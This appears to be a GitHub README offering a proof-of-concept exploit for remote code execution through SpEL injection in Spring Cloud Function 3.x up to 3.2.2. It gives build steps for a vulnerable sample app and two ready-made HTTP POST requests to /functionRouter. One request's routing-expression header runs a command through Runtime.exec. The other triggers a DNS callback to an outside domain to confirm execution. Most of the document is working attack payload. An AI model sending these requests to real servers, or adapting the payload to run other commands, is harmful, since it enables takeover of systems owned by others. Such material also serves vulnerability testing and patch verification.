

# spring-spel-0day-poc
spring-cloud/spring-cloud-function RCE EXP POC
https://github.com/spring-cloud/spring-cloud-function
header
```
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("open -a calculator.app")
```

## 受影响吧版本
SpringCloudFunction 3 <= 漏洞版本 <= 3.2.2

# build
```bash
wget https://github.com/spring-cloud/spring-cloud-function/archive/refs/tags/v3.1.6.zip
unzip v3.1.6.zip
cd spring-cloud-function-3.1.6
cd spring-cloud-function-samples/function-sample-pojo
mvn package
java -jar ./target/function-sample-pojo-2.0.0.RELEASE.jar
```
<img width="1236" alt="image" src="https://user-images.githubusercontent.com/18223385/160410727-35bf6bae-bb32-48c1-9081-edeef1e510f1.png">

# get path lists for test

```bash
find . -name "*.java"|xargs -I % cat %|grep -Eo '"([^" \.\/=>\|,:\}\+\)'"'"']{8,})"'|sort -u|sed 's/"//g'
```
```
...
functionRouter
uppercase
lowercase
...
```

<img width="829" alt="image" src="https://user-images.githubusercontent.com/18223385/160410037-12fd9be5-d35f-4009-9333-632eb29df54c.png">

# poc1

```
POST /functionRouter HTTP/1.1
host:127.0.0.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15
Connection: close
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("open -a /System/Applications/Calculator.app")
Content-Length: 5

helloexp
```

<img width="1148" alt="image" src="https://user-images.githubusercontent.com/18223385/160409293-eae65d89-9dea-43c9-8157-795f124489ad.png">

# poc2

```
POST /functionRouter HTTP/1.1
host:127.0.0.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15
Connection: close
spring.cloud.function.routing-expression:T(java.net.InetAddress).getByName("random87535.rce.helloexp.com")
Content-Length: 5

helloexp
```

## official GitHub info
https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f
